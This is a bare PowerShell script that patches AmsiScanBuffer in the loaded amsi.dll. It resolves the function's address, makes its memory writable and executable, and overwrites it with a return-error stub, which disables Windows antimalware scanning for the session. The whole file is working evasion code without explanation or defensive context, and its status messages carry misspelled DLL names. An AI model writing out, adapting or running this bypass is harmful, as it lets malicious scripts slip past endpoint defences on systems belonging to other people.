$modules = [System.Diagnostics.Process]::GetCurrentProcess().Modules
$hAmsi = [IntPtr]::Zero

foreach ($module in $modules) {
    if ($module.ModuleName -eq "amsi.dll") {
        $hAmsi = $module.BaseAddress
        Write-Host "Found amsil.dll at: $hAmsi"
        break
    }
}
if ($hAmsi -eq [IntPtr]::Zero) {
    Write-Host "amdi.dll not found"
    exit
}

$kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type -TypeDefinition $kernel32

$funcName = "AmsiScanBuffer"
$bufferAddr = [Kernel32]::GetProcAddress($hAmsi, $funcName)

if ($bufferAddr -eq [IntPtr]::Zero) {
    Write-Host "$funcName not found in amsi.dll"
    exit
} else {
    Write-Host "$funcName found at: $bufferAddr"
}

[UInt32]$size = 0x5
[UInt32]$protectFlag = 0x40
[UInt32]$oldProtectFlag = 0

$result = [Kernel32]::VirtualProtect($bufferAddr, $size, $protectFlag, [Ref]$oldProtectFlag)

if (-not $result) {
    $errCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    Write-Host "Memory permission failed: $errCode"
    exit
} else {
    Write-Host "Memory protection changed successfully"
}

$buffer = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)

[System.Runtime.InteropServices.Marshal]::Copy($buffer, 0, $bufferAddr, 6)